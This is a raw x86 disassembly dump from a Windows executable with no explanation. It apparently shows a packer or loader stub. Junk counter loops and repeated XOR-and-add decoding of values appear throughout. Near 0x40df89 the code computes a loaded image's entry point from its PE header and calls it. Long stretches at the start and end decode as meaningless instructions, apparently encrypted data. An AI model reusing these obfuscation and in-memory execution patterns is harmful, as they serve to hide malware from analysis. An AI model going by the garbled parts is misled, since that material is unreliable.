  40d782:	jbe    0x40d73b
  40d784:	push   0x1d3d8b7
  40d789:	pop    ecx
  40d78a:	lods   eax,DWORD PTR ds:[esi]
  40d78b:	mulps  xmm1,xmm5
  40d78e:	or     esp,ecx
  40d790:	pop    es
  40d791:	cmp    al,0xf
  40d793:	stos   BYTE PTR es:[edi],al
  40d794:	outs   dx,DWORD PTR ds:[esi]
  40d795:	push   0x66
  40d797:	sbb    dl,bh
  40d799:	xchg   ebp,eax
  40d79a:	add    ebp,DWORD PTR [eax-0x3db98205]
  40d7a0:	xlat   BYTE PTR ds:[ebx]
  40d7a1:	mov    dx,0xc974
  40d7a5:	pop    edi
  40d7a6:	dec    ebx
  40d7a7:	dec    ebx
  40d7a8:	sbb    DWORD PTR [edx-0x19],0x172acc23
  40d7af:	sub    al,0x9a
  40d7b1:	aas    
  40d7b2:	jecxz  0x40d78a
  40d7b4:	cmp    eax,0xb19e6078
  40d7b9:	push   ebp
  40d7ba:	test   esi,esi
  40d7bc:	dec    edi
  40d7bd:	pop    ebp
  40d7be:	push   edx
  40d7bf:	lods   eax,DWORD PTR ds:[esi]
  40d7c0:	std    
  40d7c1:	rol    DWORD PTR [ecx+0x7bca1700],1
  40d7c7:	ds fdiv st(2),st
  40d7ca:	or     esp,DWORD PTR gs:0xab8167da
  40d7d1:	push   edi
  40d7d2:	mov    ds:0xab86b353,eax
  40d7d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d8:	(bad)  [edx+eax*2]
  40d7db:	mov    eax,ds:0xccbb08d8
  40d7e0:	sub    eax,0x36c0ce87
  40d7e5:	dec    esi
  40d7e6:	mov    ah,BYTE PTR [esp+eax*2]
  40d7e9:	es pop ebx
  40d7eb:	dec    ecx
  40d7ec:	into   
  40d7ed:	mov    ebp,0xd0df68af
  40d7f2:	add    eax,0x59a2f530
  40d7f7:	mov    eax,ds:0xce7c5637
  40d7fc:	outs   dx,BYTE PTR ds:[esi]
  40d7fd:	in     al,0x19
  40d7ff:	int3   
  40d800:	test   ch,ch
  40d802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d803:	into   
  40d804:	mov    dl,0xc3
  40d806:	mov    ch,0xaf
  40d808:	inc    esi
  40d809:	fmul   DWORD PTR [edx-0x7fd231e0]
  40d80f:	ins    BYTE PTR es:[edi],dx
  40d810:	mov    eax,ds:0xeeb1390c
  40d815:	inc    ebx
  40d816:	xlat   BYTE PTR ds:[ebx]
  40d817:	idiv   edi
  40d819:	iret   
  40d81a:	cmp    al,dl
  40d81c:	dec    esi
  40d81d:	jnp    0x40d7e9
  40d81f:	adc    BYTE PTR [ecx+0x2922f0fa],ah
  40d825:	mov    esi,0x4e597f8f
  40d82a:	je     0x40d7b9
  40d82c:	and    eax,0x65311ced
  40d831:	lods   eax,DWORD PTR ds:[esi]
  40d832:	imul   ebp,DWORD PTR [ebp+0x4e],0x95f24c10
  40d839:	in     al,0x4e
  40d83b:	push   edx
  40d83c:	xchg   edx,eax
  40d83d:	retf   
  40d83e:	xchg   edx,eax
  40d83f:	arpl   WORD PTR [ecx+0x596d27c9],cx
  40d845:	repnz mov al,0x10
  40d848:	push   esp
  40d849:	ss retf 0x44
  40d84d:	aas    
  40d84e:	jle    0x40d803
  40d850:	xchg   DWORD PTR [ebx-0x38],eax
  40d853:	adc    ecx,DWORD PTR [edi-0x66]
  40d856:	stc    
  40d857:	push   0xffffffeb
  40d859:	jae    0x40d858
  40d85b:	fistp  QWORD PTR [edi]
  40d85d:	mov    ds:0x977ff1d4,al
  40d862:	cmp    eax,0x9f456d3a
  40d867:	in     al,0x21
  40d869:	jb     0x40d838
  40d86b:	inc    ebp
  40d86c:	pop    esp
  40d86d:	sub    ebx,esi
  40d86f:	mov    BYTE PTR [edi-0xf82fca1],0x8b
  40d876:	push   ebp
  40d877:	loopne 0x40d804
  40d879:	pop    ebp
  40d87a:	clc    
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fd69,0x42e19c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fdf6,0x42fd71
  40d8af:	call   DWORD PTR ds:0x42e517
  40d8b5:	and    DWORD PTR ds:0x42fd7d,0x42fe02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e1b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e1a4,0x42fd69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e58f
  40d8ee:	sbb    DWORD PTR ds:0x42e77b,0x42fdf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fd75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e4d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fdf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e1a4,0x42e777
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fdee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fd6d,0x42e198
  40d977:	call   DWORD PTR ds:0x42e51f
  40d97d:	mov    DWORD PTR ds:0x42e19c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e40f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd81,0x42e1b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fd6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e37b
  40d9be:	mov    DWORD PTR ds:0x42fe0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e198,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fd75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fd75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fd75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fd75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e20d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e5cf
  40da20:	cmp    DWORD PTR ds:0x42fd75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fd75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fd75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fd75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e783,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e773,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fd51,0x42e19c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e5d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e787,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e787,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e787,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e4e3
  40dae4:	cmp    DWORD PTR ds:0x42e787,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e787
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e787,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e787
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e787,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e77f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e77f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e77f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e5d7
  40db41:	cmp    DWORD PTR ds:0x42e77f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e77f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e77f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e77f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e77f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fdf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fdf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fdf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e5db
  40db97:	cmp    DWORD PTR ds:0x42fdf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e787,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e793,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fdfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fd65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fd65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fd65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fd65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fd65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e4e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e1a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e777,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e777,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e777,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e4eb
  40dcaa:	cmp    DWORD PTR ds:0x42e777,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e777
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e777,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e777
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e777,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe02,0x42e1ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe02,0x42e1a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fd51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e198,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fdf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fdf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fdf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e4ef
  40dd4f:	cmp    DWORD PTR ds:0x42fdf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e1b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe06,0x42fd7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e773,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e77f,0x42fe0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e76b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fd65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fd65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fd65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fd65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd89
  40de0d:	push   0x42e2ed
  40de12:	call   DWORD PTR ds:0x42e4f3
  40de18:	cmp    DWORD PTR ds:0x42fd65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fda1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fd7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fd75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fd75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fd75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e5df
  40de65:	mov    edx,DWORD PTR ds:0x42fd75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fd75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fd69,0x42fd55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fd69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x445b2fbc]
  40e122:	pop    edx
  40e123:	in     eax,0x68
  40e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e126:	jo     0x40e198
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e19e
  40e12d:	ss mov eax,0x8bb62026
  40e133:	xchg   BYTE PTR [ebx+0x4],ch
  40e136:	out    0xd,eax
  40e138:	mov    dl,al
  40e13a:	and    eax,0x6d2b6034
  40e13f:	ins    BYTE PTR es:[edi],dx
  40e140:	fidivr WORD PTR cs:[edi]
  40e143:	cdq    
  40e144:	sbb    al,0x9
  40e146:	jmp    0x4017:0x69931f54
  40e14d:	jmp    0x8af4764a
  40e152:	mov    edi,0x48ed37e0
  40e157:	fucomip st,st(6)
  40e159:	add    BYTE PTR [edx],cl
  40e15b:	ret    0x9a81
  40e15e:	inc    esi
  40e15f:	mov    edi,0xe1bf4667
  40e164:	test   edx,eax
  40e166:	pop    ss
  40e167:	or     esi,DWORD PTR [edi+0x21]
  40e16a:	jmp    0xe30f:0xd7a3e9ee
  40e171:	out    dx,al
  40e172:	fsub   QWORD PTR [ebp+eiz*8+0x78eed127]
  40e179:	mov    bl,BYTE PTR [eax+0x45]
  40e17c:	xchg   esp,eax
  40e17d:	or     ch,BYTE PTR [ebp+0x6abf56dc]
  40e183:	dec    esi
  40e184:	mov    ds:0xcdb38bee,eax
  40e189:	jle    0x40e124
  40e18b:	call   0xf6d207f0
  40e190:	sub    DWORD PTR [edx+0xf0a4209],0x6ce79163
  40e19a:	(bad)
  40e19d:	push   es
  40e19e:	push   ss
  40e19f:	stos   DWORD PTR es:[edi],eax
  40e1a0:	sub    bl,BYTE PTR [edi+0xf]
  40e1a3:	aaa    
  40e1a4:	leave  
  40e1a5:	pop    ds
  40e1a6:	(bad)  
  40e1a7:	fdivr  DWORD PTR [esi+0x2f426a33]
  40e1ad:	daa    
  40e1ae:	xchg   esp,eax
  40e1af:	retf   
  40e1b0:	cmp    ebx,DWORD PTR [ecx-0x6c]
  40e1b3:	pop    ebx
  40e1b4:	xchg   edx,eax
  40e1b5:	out    dx,eax
  40e1b6:	shl    BYTE PTR [ebx],1
  40e1b8:	stos   DWORD PTR es:[edi],eax
  40e1b9:	jmp    0x40e20d
  40e1bb:	xor    DWORD PTR [edx+eax*4+0x1051762e],edx
  40e1c2:	les    ebp,FWORD PTR [esi]
  40e1c4:	fwait
  40e1c5:	shl    cl,cl
  40e1c7:	and    ecx,DWORD PTR [ebx+0x8de5520]
  40e1cd:	cmp    ch,0x62
  40e1d0:	into   
  40e1d1:	mov    ch,0xd4
  40e1d3:	sar    edi,1
  40e1d5:	test   BYTE PTR [ecx-0x6d],dh
  40e1d8:	push   ebx
  40e1d9:	lods   eax,DWORD PTR ds:[esi]
  40e1da:	(bad)  
  40e1dc:	repz push cs
